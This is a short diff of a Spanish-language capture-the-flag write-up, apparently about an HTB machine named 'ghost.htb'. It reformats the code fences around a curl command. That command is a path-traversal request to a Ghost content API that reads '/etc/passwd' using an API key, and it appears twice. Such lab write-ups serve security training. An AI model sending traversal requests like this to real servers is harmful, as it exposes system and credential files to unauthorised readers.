@@ -314,8 +314,10 @@ curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../etc/passw
 ```
 
 `Podemos usar la clave API pública proporcionada anteriormente en el archivo Léame, probar cuánto ../ Necesitamos identificar la posición del directorio del sistema de archivos`
-  ```python
-```
+
+```python
 curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a"
+```
+
 
 ![[Pasted image 20240718202009.png]]
